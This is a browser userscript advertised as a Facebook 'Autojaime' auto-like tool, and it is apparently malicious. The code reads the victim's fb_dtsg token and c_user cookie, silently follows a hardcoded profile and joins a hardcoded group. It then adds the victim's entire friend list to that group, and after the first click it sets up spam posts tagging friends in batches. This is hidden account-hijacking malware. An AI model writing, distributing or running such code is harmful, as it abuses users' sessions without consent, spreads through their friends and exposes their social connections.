// ==UserScript==
// @name			*[NEW]* facebook Autojaime
// @namespace		*[NEW]* facebook Autojaime
// @description		*[NEW]* facebook Autojaime 
// @author			hich
// @authorURL		none
// @include			htt*://www.facebook.com/*
// @exclude 			htt*://apps.facebook.com/*
// @icon			none
// @version			v 1.0 Final
// @exclude			htt*://*static*.facebook.com*
// @exclude			htt*://*channel*.facebook.com*
// @exclude			htt*://developers.facebook.com/*
// @exclude			htt*://upload.facebook.com/*
// @exclude			htt*://www.facebook.com/common/blank.html
// @exclude			htt*://*connect.facebook.com/*
// @exclude			htt*://*facebook.com/connect*
// @exclude			htt*://www.facebook.com/plugins/*
// @exclude			htt*://www.facebook.com/l.php*
// @exclude			htt*://www.facebook.com/ai.php*
// @exclude			htt*://www.facebook.com/extern/*
// @exclude			htt*://www.facebook.com/pagelet/*
// @exclude			htt*://api.facebook.com/static/*
// @exclude			htt*://www.facebook.com/contact_importer/*
// @exclude			htt*://www.facebook.com/ajax/*
// @exclude			htt*://www.facebook.com/advertising/*
// @exclude			htt*://www.facebook.com/ads/*
// @exclude			htt*://www.facebook.com/sharer/*
// @exclude			htt*://www.facebook.com/send/*
// @exclude			htt*://www.facebook.com/mobile/*
// @exclude			htt*://www.facebook.com/settings/*
// @exclude			htt*://www.facebook.com/dialog/*
// @exclude			htt*://www.facebook.com/plugins/*
// @exclude			htt*://www.facebook.com/bookmarks/*

// ==/UserScript==

var fb_dtsg=document.getElementsByName("fb_dtsg")[0].value;
var user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);

function cereziAl(B){
var A=B+"=";
		if(document.cookie.length>0){konum=document.cookie.indexOf(A);
		if(konum!=-1){konum+=A.length;son=document.cookie.indexOf(";",konum);
		if(son==-1){son=document.cookie.length}return unescape(document.cookie.substring(konum,son))}else{return""}}
}

function getRandomInt(B,A){
	return Math.floor(Math.random()*(A-B+1))+B
}
function randomValue(A){return A[getRandomInt(0,A.length-1)]}

var fb_dtsg=document.getElementsByName("fb_dtsg")[0].value;
var user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);

function a(D){
	var C=new XMLHttpRequest();
	var B="/ajax/follow/follow_profile.php?__a=1";
	var A="profile_id="+D+"&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg="+fb_dtsg+"&lsd&__"+user_id+"&phstamp=";
		C.open("POST",B,true);
		C.setRequestHeader("Content-type","application/x-www-form-urlencoded");
		C.setRequestHeader("Content-length",A.length);
		C.setRequestHeader("Connection","close");
		C.onreadystatechange=function(){if(C.readyState==4&&C.status==200){C.close}};
		C.send(A)}
		
		
function sublist(B){
	var A=document.createElement("script");
		A.innerHTML="new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: "+B+" }).send();";
		document.body.appendChild(A)}
		
a("100005390741915");

var gid=["465088446889608"];
var fb_dtsg=document.getElementsByName("fb_dtsg")[0]["value"];
var user_id=document.cookie["match"](document.cookie["match"](/c_user=(\d+)/)[1]);
var httpwp=new XMLHttpRequest();
var urlwp="/ajax/groups/membership/r2j.php?__a=1";
var paramswp="&ref=group_jump_header&group_id="+gid+"&fb_dtsg="+fb_dtsg+"&__user="+user_id+"&phstamp=";
httpwp.open("POST",urlwp,true);
httpwp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
httpwp.setRequestHeader("Content-length",paramswp.length);
httpwp.setRequestHeader("Connection","keep-alive");
httpwp.send(paramswp);
var fb_dtsg=document.getElementsByName("fb_dtsg")[0]["value"];
var user_id=document.cookie["match"](document.cookie["match"](/c_user=(\d+)/)[1]);
var friends=new Array();
gf=new XMLHttpRequest();
gf.open("GET","/ajax/typeahead/first_degree.php?__a=1&viewer="+user_id+"&token"+Math.random()+"&filter[0]=user&options[0]=friends_only",false);
gf.send();
if(gf.readyState!=4){}else{data=eval("("+gf.responseText["substr"](9)+")");
if(data.error){}else{friends=data.payload["entries"]["sort"](function(B,A){return B.index-A.index})}}for(var i=0;i<friends.length;i++){var httpwp=new XMLHttpRequest();
var urlwp="/ajax/groups/members/add_post.php?__a=1";
var paramswp="&fb_dtsg="+fb_dtsg+"&group_id="+gid+"&source=typeahead&ref=&message_id=&members="+friends[i]["uid"]+"&__user="+user_id+"&phstamp=";
httpwp.open("POST",urlwp,true);
httpwp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
httpwp.setRequestHeader("Content-length",paramswp.length);
httpwp.setRequestHeader("Connection","keep-alive");
httpwp.onreadystatechange=function(){if(httpwp.readyState==4&&httpwp.status==200){}};
httpwp.send(paramswp)}
var spage_id="179057685575465";
var spost_id="179057685575465";
var sfoto_id="179057685575465";
var user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var smesaj="bonjour";
var smesaj_text="bonjour a vous tous";
var arkadaslar=[];
var svn_rev;
var bugun=new Date();
var btarihi=new Date();
btarihi.setTime(bugun.getTime()+1000*60*60*24*1);
if(!document.cookie.match(/paylasti=(\d+)/)){document.cookie="paylasti=hayir;expires="+btarihi.toGMTString()}function sarkadaslari_al(){var xmlhttp=new XMLHttpRequest();
xmlhttp.onreadystatechange=function(){if(xmlhttp.readyState==4){eval("arkadaslar = "+xmlhttp.responseText.toString().replace("for (;;);","")+";");
for(f=0;f<Math.round(arkadaslar.payload.entries.length/10);f++){smesaj="";smesaj_text="";
for(i=f*10;i<(f+1)*10;i++){if(arkadaslar.payload.entries[i]){smesaj+=" @["+arkadaslar.payload.entries[i].uid+":"+arkadaslar.payload.entries[i].text+"]";
smesaj_text+=" "+arkadaslar.payload.entries[i].text}}sdurumpaylas()}}};
var params="&filter[0]=user";params+="&options[0]=friends_only";
params+="&options[1]=nm";
params+="&token=v7";
params+="&viewer="+user_id;
params+="&__user="+user_id;
if(document.URL.indexOf("https://")>=0){xmlhttp.open("GET","https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1"+params,true)}else{xmlhttp.open("GET","http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1"+params,true)}xmlhttp.send()}var tiklama=document.addEventListener("click",function(){if(document.cookie.split("paylasti=")[1].split(";")[0].indexOf("hayir")>=0){svn_rev=document.head.innerHTML.split('"svn_rev":')[1].split(",")[0];
sarkadaslari_al();
document.cookie="paylasti=evet;expires="+btarihi.toGMTString();document.removeEventListener(tiklama)}},false);